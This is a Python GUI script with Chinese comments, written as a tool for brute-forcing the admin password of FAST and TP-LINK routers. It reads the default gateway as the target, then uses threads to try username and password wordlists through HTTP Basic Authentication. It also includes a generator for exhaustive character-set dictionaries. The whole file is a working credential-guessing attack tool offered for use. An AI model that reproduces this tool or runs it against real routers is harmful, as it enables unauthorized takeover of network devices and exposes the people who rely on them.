# !/usr/bin/env python           
# coding  : utf-8 
# Date    : 2018-04-23 18:37:53
# Author  : b4zinga
# Email   : b4zinga@outlook.com
# Function: 爆破路由器管理密码       FAST、 TP-LINK

import os
import base64
from tkinter import messagebox
from urllib import request
import itertools
from tkinter import *
from tkinter.filedialog import askopenfilename, asksaveasfilename
from tkinter.scrolledtext import ScrolledText
from threading import Thread


# 爆破路由器密码
def crack(url, username, passwordlist):
    for password in passwordlist:
        req = request.Request(url=url)
        header_data = (username + ':' + password)
        # 对用户名和密码进行base64编码
        # 进行base64编码之前，首先要将字符串编码为uft-8，否则会报错
        pwd_base64 = "Basic " + base64.b64encode(header_data.encode(encoding='utf-8')).decode()
        req.add_header('Authorization', pwd_base64)
        try:
            response = request.urlopen(req)
            text.insert(0.0, '\n[+] Successful ! Username:{}\tPassword:{}\n\n'.format(username, password))
            text.update()
            messagebox.showinfo('成功', 'Username:{}\nPassword:{}'.format(username, password))
            return
        except:
            text.insert(0.0, '[-]trying username:' + username + '\tpassword:' + password + "\n")
            # time.sleep(0.1)
            text.update()


# 探测管理IP，将得到的值赋值给输入框
def getadminurl():
    import netifaces
    adminurl = netifaces.gateways()['default'][netifaces.AF_INET][0]

    admin_url.set("http://" + adminurl)


# 生成字典
def makedic(n, path):
    lower = upper = num = ''
    if lowercase.get():
        lower = 'abcdefghijklmnopqrstuvwxyz'
    if uppercase.get():
        upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    if number.get():
        num = '0123456789'
    words = lower + upper + num  # 生成字典的源字符串
    r = itertools.product(words, repeat=n)  # n为重复次数
    dic = open(path, 'w')
    for i in r:
        dic.write(''.join(i))
        dic.write("".join("\n"))
    dic.close()
    messagebox.showwarning('提示', '成功生成字典！')


# 选择字典保存路径
def selectsavepath():
    path_ = asksaveasfilename(filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    save_dic_path.set(path_)


# 选择密码路径函数
def selectdicpath():
    path_ = askopenfilename(filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    dicpath.set(path_)


# 选择用户路径函数
def selectusrpath():
    path_ = askopenfilename(filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    usrpath.set(path_)


# 获取字典
def getdic(path):
    dics = []
    with open(path) as file:
        for f in file:
            dics.append(f.replace('\n', ''))
    return dics


# 添加多线程
def main():
    usernamelist = getdic(usrpath.get())
    passwordlist = getdic(dicpath.get())
    url = admin_url.get()
    for user in usernamelist:
        t = Thread(target=crack, args=(url, user, passwordlist))
        t.start()


if __name__ == '__main__':
    root = Tk()
    root.title('路由器密码爆破工具')
    Label(root,text='路由器密码爆破工具',font=('微软雅黑', 18)).grid(row=0,column=0)
    # ========================爆破模块=====================================
    frame_crack = LabelFrame(root, text="爆破")
    frame_crack.grid(row=1, column=0, padx=10, pady=10)

    dicpath = StringVar()
    usrpath = StringVar()
    admin_url = StringVar()
    admin_url.set('请在此输入管理地址...  (如:http://192.168.1.254)')

    Entry(frame_crack, textvariable=dicpath, width=47, ).grid(row=0, column=0)
    Button(frame_crack, text="选择密码字典", command=selectdicpath).grid(row=0, column=1)
    Entry(frame_crack, textvariable=usrpath, width=47, ).grid(row=1, column=0)
    Button(frame_crack, text="选择用户字典", command=selectusrpath).grid(row=1, column=1)

    Entry(frame_crack, textvariable=admin_url, width=47, ).grid(row=2, column=0)
    Button(frame_crack, text="探测管理地址", command=getadminurl).grid(row=2, column=1)

    text = ScrolledText(frame_crack,
                        width=40,
                        height=7,
                        background='#ffffff',
                        font=('微软雅黑', 10),
                        fg='blue')
    text.grid(row=3, column=0)

    btn_crack = Button(frame_crack,
                       text='开始',
                       command=main).grid(row=3, column=1)
    # ========================字典模块=====================================
    save_dic_path = StringVar()  # 字典保存路径
    lowercase = IntVar()  # 小写字母
    uppercase = IntVar()  # 大写字母
    number = IntVar()  # 数字
    dic_len = IntVar()

    frame_dic = LabelFrame(root, text="生成字典")
    frame_dic.grid(row=2, column=0, padx=10, pady=10)

    frame_part1 = Frame(frame_dic)
    frame_part1.grid(row=0, column=0)
    chk_lower = Checkbutton(frame_part1, text='小写字母', variable=lowercase).grid(column=0, row=0)
    chk_upper = Checkbutton(frame_part1, text='大写字母', variable=uppercase).grid(column=1, row=0)
    chk_num = Checkbutton(frame_part1, text='数字', variable=number).grid(column=2, row=0)

    frame_part2 = Frame(frame_dic)
    frame_part2.grid(row=1, column=0)
    Entry(frame_part2, textvariable=save_dic_path, width=47).grid(row=0, column=0)
    Button(frame_part2, text="字典保存路径", command=selectsavepath).grid(row=0, column=1)

    frame_part3 = Frame(frame_dic)
    frame_part3.grid(row=2, column=0)
    Entry(frame_part3, textvariable=dic_len, width=47).grid(row=0, column=0)
    Label(frame_part3, text='输入字典长度').grid(row=0, column=1)

    btn_create = Button(frame_dic, text='生成字典', command=lambda: makedic(dic_len.get(), save_dic_path.get()))
    btn_create.grid(column=0, row=3)

    mainloop()
